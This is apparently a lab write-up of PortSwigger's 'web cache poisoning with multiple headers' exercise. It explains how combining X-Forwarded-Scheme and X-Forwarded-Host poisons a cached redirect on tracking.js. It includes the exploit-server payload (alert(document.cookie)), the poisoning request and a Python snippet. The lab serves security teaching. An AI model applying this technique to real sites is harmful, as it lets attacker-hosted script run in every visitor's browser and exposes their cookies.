# Web cache poisoning with multiple headers

**Category:** Web Cache Poisoning
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

Single-header cache poisoning is the easy case to find, because one canary header is enough to spot the reflection. This lab is a reminder that some vulnerabilities only exist in combination — neither header alone does anything interesting, but stacking them together unlocks a redirect an attacker fully controls.

## The Target

The site imports a JavaScript resource from a path like `/resources/js/tracking.js`, cached with a short TTL (`Cache-Control: max-age=30`). Individually testing headers here didn't turn up an obvious reflection the way the earlier labs did.

## The Investigation

We tested `X-Forwarded-Host` and `X-Forwarded-Scheme` against the JS resource URL. Neither header alone changed anything visible. Sending both together, though, produced a `302` redirect to `https://example.com/` — `X-Forwarded-Scheme: http` was enough to convince the application it needed to force an HTTPS redirect (a common "always upgrade to secure scheme" pattern), and once that redirect logic engaged, `X-Forwarded-Host` supplied the hostname it redirected to.

That's a materially more valuable primitive than a reflected XSS breakout: it's a redirect on a *cacheable resource*, which means we could point every browser that imports `tracking.js` at a domain we control, instead of trying to inject markup into the existing response.

## The Exploit

We hosted the payload on the exploit server directly at the resource path the target application imports:

```
POST /store
responseFile: /resources/js/tracking.js
responseHead: HTTP/1.1 200 OK
              Content-Type: application/javascript; charset=utf-8
              Access-Control-Allow-Origin: *
responseBody: alert(document.cookie)
```

Then we sent the combined-header request against the JS resource URL itself, forcing the `302` to resolve to our exploit server's hostname:

```
GET /resources/js/tracking.js HTTP/1.1
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-<id>.exploit-server.net
```

Our poisoning function checked each response for a cache miss, then verified with a clean request that the redirect `Location` still pointed at our exploit server:

```python
headers = {"X-Forwarded-Scheme": "http", "X-Forwarded-Host": exploit_host}
poisoned = await poison_via_multi_header(js_url, headers, check_string=exploit_host)
```

Once the redirect was cached, any browser requesting `tracking.js` — including the lab's simulated victim — gets redirected straight to our exploit server and loads `alert(document.cookie)` in its place.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution reaches the same combined-header discovery: fuzz `X-Forwarded-Host` and `X-Forwarded-Scheme` against the JS resource, notice the redirect only appears when both are present, host the payload script on the exploit server at the same resource path, and poison the cached redirect. The mechanism is identical to ours.

The one thing worth calling out is how this lab is structured to actively discourage single-header testing — testing `X-Forwarded-Host` alone against `/resources/js/tracking.js` looks like a dead end, which is presumably intentional. The lesson generalizes past this specific pair: fuzzing unkeyed headers one at a time is a reasonable first pass, but a header that shows *no effect* in isolation isn't proof it's safe, just proof it needs a second unkeyed input to activate.

## What This Teaches Us

This is the first lab in the series where the interesting finding isn't "this header is reflected" but "this header changes behavior only in combination with another header." Real-world applications built behind CDNs and reverse proxies routinely honor a whole family of `X-Forwarded-*` headers together — scheme, host, port, prefix — and it's the interaction between them (forcing a scheme upgrade, then trusting the host that upgrade redirects to) that created the exploitable primitive, not any single header on its own. A cache poisoning scan that only tests headers independently will miss this class of bug entirely.
